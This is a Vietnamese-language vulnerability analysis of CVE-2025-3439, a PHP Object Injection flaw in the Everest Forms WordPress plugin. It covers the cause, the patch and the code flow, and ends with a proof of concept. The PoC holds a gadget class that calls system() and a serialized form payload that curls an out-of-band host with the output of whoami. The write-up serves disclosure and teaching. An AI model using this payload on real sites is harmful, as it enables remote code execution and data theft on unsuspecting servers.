# CVE-2025-3439 Analysis & POC


<!--more-->

## CVE & Basic Info
**Plugin Everest Forms – Contact Form, Quiz, Survey, Newsletter & Payment Form Builder for WordPress** trên WordPress tồn tại lỗ hổng **PHP Object Injection** trong tất cả các phiên bản cho đến, và bao gồm, **3.1.1** thông qua việc giải tuần tự dữ liệu không tin cậy từ tham số `field_value`.
Điều này cho phép kẻ tấn công **chưa xác thực** chèn một PHP Object. Phần mềm dễ bị tấn công này **không có chuỗi POP** nào được biết đến, nghĩa là lỗ hổng này sẽ không gây ảnh hưởng trừ khi có plugin hoặc theme khác chứa chuỗi POP được cài đặt trên trang web.
Nếu chuỗi POP tồn tại thông qua plugin hoặc theme bổ sung được cài đặt trên hệ thống mục tiêu, nó có thể cho phép kẻ tấn công thực hiện các hành động như **xóa tệp tùy ý**, **lấy dữ liệu nhạy cảm**, hoặc **thực thi mã** tùy thuộc vào chuỗi POP hiện diện.

* **CVE ID**: [CVE-2025-3439](https://www.cve.org/CVERecord?id=CVE-2025-3439)
* **Vulnerability Type**: PHP Object Injection
* **Affected Versions**: <= 3.1.1
* **Patched Versions**: 3.1.2
* **CVSS severity**: High (9.8)
* **Required Privilege**: Unauthenticated
* **Product**: [WordPress Everest Forms Plugin](https://wordpress.org/plugins/everest-forms/)

## Requirements
* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **Everest Forms**:  
    * `3.1.1` – **vulnerable**  
    * `3.1.2` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ diff nào.

## Cause
**Trong phiên bản lỗi (v3.1.1):**

```php {title="html-admin-page-entries-view.php" data-open=true hl_lines=[3]}
if ( ! empty( $field_value ) || is_numeric( $field_value ) ) {
    if ( is_serialized( $field_value ) ) {
        $field_value = maybe_unserialize( $field_value );
    }
    ...
}
```

Trong đoạn mã này, hàm **`maybe_unserialize()`** được gọi trực tiếp trên dữ liệu người dùng (`$field_value`). Điều này tạo ra lỗ hổng nghiêm trọng:

- **Nguy cơ Object Injection**: Nếu attacker chèn payload PHP object vào dữ liệu base64, quá trình decode và unserialize sẽ khởi tạo object độc hại, dẫn đến **Object Injection** và có khả năng tiến tới **Remote Code Execution (RCE)**.  
- **Thiếu kiểm tra an toàn**: Không có bước xác thực dữ liệu trước khi thực hiện unserialize.  
- **Không có cơ chế fallback**: Nếu dữ liệu không hợp lệ hoặc bị lỗi, hệ thống không có phương án xử lý thay thế, khiến ứng dụng dễ bị khai thác.  

**Bản vá (v3.1.2):** 

![Diff](diff.png "Sự thay đổi của bản vá")

Bản vá đã sử dụng `evf_maybe_unserialize()` thay cho `maybe_unserialize()` của WordPress:

```php {title="evf-core-functions.php" data-open=true hl_lines=[4,5]}
function evf_maybe_unserialize( $data, $options = array() ) {
    if ( is_serialized( $data ) ) {
        if ( version_compare( PHP_VERSION, '7.1.0', '>=' ) ) {
            $options = wp_parse_args( $options, array( 'allowed_classes' => false ) );
            return @unserialize( trim( $data ), $options ); //phpcs:ignore.
        }
        return @unserialize( trim( $data ) ); //phpcs:ignore.
    }

    return $data;
}
```

`unserialize()` được sử dụng với option `'allowed_classes' => false` đã loại bỏ hoàn toàn khả năng tạo object, từ đó xử lý triệt để lỗ hổng.

## Analysis
Plugin đã đăng ký một submenu `Entries`:

```php {title="class-evf-admin-menus.php" data-open=true hl_lines=[]}
add_submenu_page( 'everest-forms', esc_html__( 'Everest Forms Entries', 'everest-forms' ), esc_html__( 'Entries', 'everest-forms' ), current_user_can( 'everest_forms_view_entries' ) ? 'everest_forms_view_entries' : 'everest_forms_view_others_entries', 'evf-entries', array( $this, 'entries_page' ) );
```

Callback `entries_page` được gọi khi truy cập vào submenu này:

```php {title="class-evf-admin-menus.php" data-open=true hl_lines=[]}
public function entries_page() {
    EVF_Admin_Entries::page_output();
}
```

Hàm gọi đến `page_output()` 

```php {title="class-evf-admin-entries.php" data-open=true hl_lines=[4,5]}
public static function page_output() {
    if ( apply_filters( 'everest_forms_entries_list_actions', false ) ) {
        do_action( 'everest_forms_entries_list_actions_execute' );
    } elseif ( isset( $_GET['view-entry'] ) ) { // phpcs:ignore WordPress.Security.NonceVerification
        include 'views/html-admin-page-entries-view.php';
    } else {
        self::table_list_output();
    }
}
```

Khi `$_GET['view-entry']` tồn tại thì view `html-admin-page-entries-view.php` sẽ được include.

![Entries](entries.png "Entries Page")

Trang này sẽ hiển thị tất cả nội dung form được submit từ người dùng.

```php {title="html-admin-page-entries-view.php" data-open=true hl_lines=[]}
$entry_meta = apply_filters( 'everest_forms_entry_single_data', $entry->meta, $entry, $form_data );
...
foreach ( $entry_meta as $meta_key => $meta_value ) {
    $meta_value = is_serialized( $meta_value ) ? $meta_value : wp_strip_all_tags( $meta_value );
    if ( evf_is_json( $meta_value ) ) {
        $meta_value = json_decode( $meta_value, true );
        $meta_value = $meta_value['value'];
    }
    ...
    $field_value     = apply_filters( 'everest_forms_html_field_value', $meta_value, $entry_meta[ $meta_key ], $entry_meta, 'entry-single' );
    ...
    if ( ! empty( $field_value ) || is_numeric( $field_value ) ) {
        if ( is_serialized( $field_value ) ) {
            $field_value = maybe_unserialize( $field_value );
        }
        ...
    }
    ...
}
```

`$entry_meta` là tập dữ liệu mà người dùng đã submit từ form hiện tại. Mỗi phần tử trong mảng này bao gồm một cặp `meta_key` và `meta_value`, và hệ thống sẽ duyệt qua từng phần tử để xử lý.

Trong vòng lặp, giá trị `$meta_value` được kiểm tra:

1. **Nếu giá trị là JSON**

   * Hàm `evf_is_json()` xác định xem chuỗi có phải JSON hợp lệ hay không.
   * Nếu đúng, dữ liệu được giải mã bằng `json_decode()` và lấy giá trị tại `$meta_value['value']`.

2. **Sau đó `$field_value` được tạo ra**

   * Giá trị này được tạo từ `$meta_value['value']` thông qua bộ lọc `everest_forms_html_field_value`.

3. **Xử lý dữ liệu serialize**

   * Nếu `$field_value` có định dạng serialize, hàm `maybe_unserialize()` sẽ được gọi để giải mã dữ liệu về dạng bình thường.

## Flow

{{< mermaid >}}
graph TD

A["User submits form → Data stored in $entry_meta"] --> B["Admin opens Entries page in wp-admin"]
B --> C["entries_page() executed"]
C --> D{"GET['view-entry'] exists?"}
D -->|No| Z["Show entries table"]
D -->|Yes| E["Load html-admin-page-entries-view.php"]

E --> F["foreach ($entry_meta as meta_key => meta_value)"]
F --> G{"Is meta_value JSON?"}
G -->|Yes| H["json_decode() → meta_value['value']"]
G -->|No| I["meta_value = wp_strip_all_tags()"]

H --> J["field_value = apply_filters('everest_forms_html_field_value', meta_value, ...)"]
I --> J

J --> K{"field_value is serialized?"}
K -->|No| L["Display value normally"]
K -->|Yes| M["maybe_unserialize(field_value) ← Vulnerable"]

M --> N{"Unserialize produces object?"}
N -->|Yes| R["Object Injection → Possible exploit if POP chain exists"]
N -->|No| L

{{< /mermaid >}}

## Proof of Concept (PoC)
1. Tạo class để test đặt trong `wp-config.php`
```php
class Evil
{
    public $command = "ls /";
    public function __destruct()
    {
        die(system($this->command));
    }
}
```
2. Submit form với giá trị được encode JSON chứa chuỗi serialized:

```http
POST /2025/11/22/test/ HTTP/1.1
Host: localhost
...

Content-Disposition: form-data; name="everest_forms[form_fields][fullname]"

{"value":"a:1:{i:0;O:4:\"Evil\":1:{s:7:\"command\";s:74:\"curl http:\/\/3hl5b0qvv7r0okj81wizv1kmddj47uvj.oastify.com?leadked=$(whoami)\";}}"}
------geckoformboundary8355bd6da3783bb27aa92837fe803a6e
...
```
3. Administrator xem entry được submit

![Result](result.png "Kết quả")

## Conclusion

Lỗ hổng tồn tại do việc **unserialize dữ liệu người dùng trực tiếp thông qua `maybe_unserialize()`** mà không giới hạn lớp được phép khởi tạo. Điều này dẫn tới khả năng **PHP Object Injection**, và trong môi trường có sẵn chuỗi POP, kẻ tấn công chưa xác thực có thể thực hiện các hành động nguy hiểm như đọc, ghi, xóa file hoặc thậm chí thực thi mã từ xa. Bản vá sử dụng `evf_maybe_unserialize()` với `allowed_classes => false` đã triệt tiêu hoàn toàn nguy cơ này.

## Key Takeaways

* **Root cause**: sử dụng `maybe_unserialize()` trên dữ liệu từ người dùng mà không kiểm soát lớp được phép tạo ra.
* **Impact**: Object Injection và có thể tiến tới RCE nếu tồn tại POP chain từ plugin hoặc theme khác.
* **Attack surface**: Bị trigger khi admin mở trang xem Entries; dữ liệu độc hại đã tồn tại từ phần submit form.
* **Fix**: Sử dụng `unserialize()` với tùy chọn `allowed_classes = false`, ngăn chặn tạo object từ dữ liệu không tin cậy.
* **Lesson learned**: Mọi dữ liệu unserialize phải được hạn chế lớp, lọc hoặc chuyển sang các định dạng an toàn hơn như JSON.

## References

[Deserialization](https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html)

[WordPress Everest Forms Plugin <= 3.1.1 is vulnerable to PHP Object Injection](https://patchstack.com/database/wordpress/plugin/everest-forms/vulnerability/wordpress-everest-forms-plugin-3-1-1-unauthenticated-php-object-injection-vulnerability)     


---

> Tác giả: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-11-25-cve-2025-3439/  

